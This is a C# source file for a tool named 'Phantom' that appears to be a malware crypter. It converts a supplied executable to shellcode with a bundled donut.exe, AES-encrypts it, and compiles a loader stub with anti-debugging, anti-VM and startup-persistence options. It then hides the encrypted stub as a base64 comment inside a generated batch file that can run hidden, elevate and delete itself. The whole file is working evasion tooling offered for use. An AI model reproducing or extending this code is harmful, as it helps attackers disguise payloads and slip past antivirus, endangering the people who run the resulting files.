using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Text;
using Microsoft.CSharp;

namespace Phantom
{
    internal class CliBuilder
    {
        private static void Log(string msg)
        {
            Console.WriteLine("[*] " + msg);
        }

        internal static void Build(string inputPath, string outputPath, bool hidden, bool selfdelete, bool runas, bool startup, bool antidebug, bool antivm)
        {
            Random rng = new Random();

            // Generate AES keys (two pairs: outer for stub/bstub encryption, inner for payload)
            byte[] _key, _iv, _stubkey, _stubiv;
            using (var aes1 = new System.Security.Cryptography.AesManaged())
            {
                _key = aes1.Key;
                _iv = aes1.IV;
            }
            using (var aes2 = new System.Security.Cryptography.AesManaged())
            {
                _stubkey = aes2.Key;
                _stubiv = aes2.IV;
            }

            EncryptionMode mode = EncryptionMode.AES;

            // Validate input
            if (!File.Exists(inputPath))
                throw new Exception("Input file not found: " + inputPath);

            if (Path.GetExtension(inputPath) != ".exe")
                throw new Exception("Input must be .exe file");

            // Read payload
            byte[] pbytes = File.ReadAllBytes(inputPath);
            bool isnetasm = false;

            // Determine file type
            PhantomMain.FileType fileType = GetFileType(inputPath);
            if (fileType == PhantomMain.FileType.Invalid)
                throw new Exception("Invalid input file type");

            if (fileType == PhantomMain.FileType.NET64 || fileType == PhantomMain.FileType.NET86)
                isnetasm = true;

            Log("File type: " + fileType);
            Log(".NET assembly: " + isnetasm);

            // Convert native to shellcode if needed
            if (!isnetasm)
            {
                Log("Converting native payload to shellcode...");
                int archType = fileType == PhantomMain.FileType.x64 ? 2 : 1;
                string payloadExtension = Path.GetExtension(inputPath);
                File.WriteAllBytes("payload_native" + payloadExtension, pbytes);
                File.WriteAllBytes("donut.exe", ExtractResource("Phantom.Resources.donut.exe"));

                ProcessStartInfo psi = new ProcessStartInfo
                {
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    FileName = "cmd.exe",
                    Arguments = "/C donut.exe -a " + archType + " -o \"payload_native.bin\" -i \"payload_native" + payloadExtension + "\" -b 1 -k 2 -x 3 & exit"
                };
                Process.Start(psi).WaitForExit();
                File.Delete("donut.exe");
                File.Delete("payload_native" + payloadExtension);
                pbytes = File.ReadAllBytes("payload_native.bin");
                File.Delete("payload_native.bin");
                Log("Shellcode size: " + pbytes.Length + " bytes");
            }

            // Encrypt payload
            Log("Encrypting payload...");
            byte[] payload_enc = Utils.Encrypt(mode, Utils.Compress(pbytes), _stubkey, _stubiv);

            // Generate and compile C# stub
            Log("Creating stub...");
            string stub = StubGen.CreateCS(_stubkey, _stubiv, mode, antidebug, antivm, startup, !isnetasm, rng);

            string tempfile = CreateTempFile(rng);
            File.WriteAllBytes("payload.exe", payload_enc);

            CSharpCodeProvider csc = new CSharpCodeProvider();
            CompilerParameters parameters = new CompilerParameters(
                new[] { "mscorlib.dll", "System.Core.dll", "System.dll", "System.Management.dll", "System.Windows.Forms.dll" },
                tempfile)
            {
                GenerateExecutable = true,
                CompilerOptions = "-optimize -unsafe",
                IncludeDebugInformation = false
            };
            parameters.EmbeddedResources.Add("payload.exe");

            Log("Compiling stub...");
            CompilerResults results = csc.CompileAssemblyFromSource(parameters, stub);
            if (results.Errors.Count > 0)
            {
                File.Delete("payload.exe");
                File.Delete(tempfile);
                StringBuilder sb = new StringBuilder();
                foreach (CompilerError err in results.Errors)
                    sb.AppendLine(err.ToString());
                throw new Exception("Stub compilation failed:\n" + sb.ToString());
            }

            byte[] stubbytes = File.ReadAllBytes(tempfile);
            File.Delete("payload.exe");
            File.Delete(tempfile);
            Log("Stub compiled: " + stubbytes.Length + " bytes");

            // Encrypt stub
            byte[] stub_enc = Utils.Encrypt(mode, Utils.Compress(stubbytes), _key, _iv);

            // Generate batch file
            Log("Creating batch file...");
            string content = FileGen.CreateBat(_key, _iv, mode, hidden, selfdelete, runas, fileType, rng);

            // Insert encrypted payload as comment line
            List<string> content_lines = new List<string>(content.Split(new string[] { Environment.NewLine }, StringSplitOptions.None));
            content_lines.Insert(rng.Next(0, content_lines.Count), ":: " + Convert.ToBase64String(stub_enc));
            content = string.Join(Environment.NewLine, content_lines);

            // Write output
            File.WriteAllText(outputPath, content, Encoding.ASCII);
            Log("Output written: " + outputPath);
            Log("Batch size: " + content.Length + " chars");
        }

        private static string CreateTempFile(Random rng)
        {
            string tempfilename = Utils.RandomString(10, rng) + ".tmp";
            File.WriteAllText(tempfilename, "");
            return tempfilename;
        }

        private static byte[] ExtractResource(String filename)
        {
            Assembly a = Assembly.GetExecutingAssembly();
            using (Stream resFilestream = a.GetManifestResourceStream(filename))
            {
                if (resFilestream == null) return null;
                byte[] ba = new byte[resFilestream.Length];
                resFilestream.Read(ba, 0, ba.Length);
                return ba;
            }
        }

        private static PhantomMain.FileType GetFileType(string path)
        {
            try
            {
                var arch = AssemblyName.GetAssemblyName(path).ProcessorArchitecture;
                return arch == ProcessorArchitecture.X86 ? PhantomMain.FileType.NET86 : PhantomMain.FileType.NET64;
            }
            catch
            {
                using (FileStream fs = new FileStream(path, FileMode.Open, FileAccess.Read))
                using (BinaryReader br = new BinaryReader(fs))
                {
                    try
                    {
                        fs.Seek(60L, SeekOrigin.Begin);
                        int peOffset = br.ReadInt32();
                        fs.Seek((long)peOffset, SeekOrigin.Begin);
                        if (br.ReadUInt32() != 17744U)
                            throw new Exception();
                        return br.ReadUInt16() == 332 ? PhantomMain.FileType.x86 : PhantomMain.FileType.x64;
                    }
                    catch
                    {
                        return PhantomMain.FileType.Invalid;
                    }
                }
            }
        }
    }
}
